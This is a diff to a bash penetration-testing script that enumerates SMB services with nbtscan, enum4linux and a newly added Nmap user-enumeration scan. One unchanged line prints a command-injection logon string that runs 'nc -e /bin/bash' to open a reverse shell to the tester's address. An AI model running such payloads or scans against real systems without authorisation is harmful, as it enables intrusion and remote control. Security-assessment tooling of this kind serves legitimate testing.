@@ -34,6 +34,8 @@ if [ "$#" = "1" ]; then
                         nbtscan $1 | tee smb_enum/nbtscan.txt 
 			printf "\n\n${Y}[+][+] enum4linux ${NC}\n\n"
 			enum4linux -a $1 | grep -P 'User\\' 
+			printf "\n\n{Y}[+][+] Enumerating SMB users with Nmap ${NC}\n\n"
+			nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139,445 $1
 			printf "\n\n${Y}[+][+] Try the following on a writable share: logon \"./='nohup nc -e /bin/bash <Your-IP-Address-here> 9001'\" ${NC}\n\n"
 			count=$((count+1))
 			fi
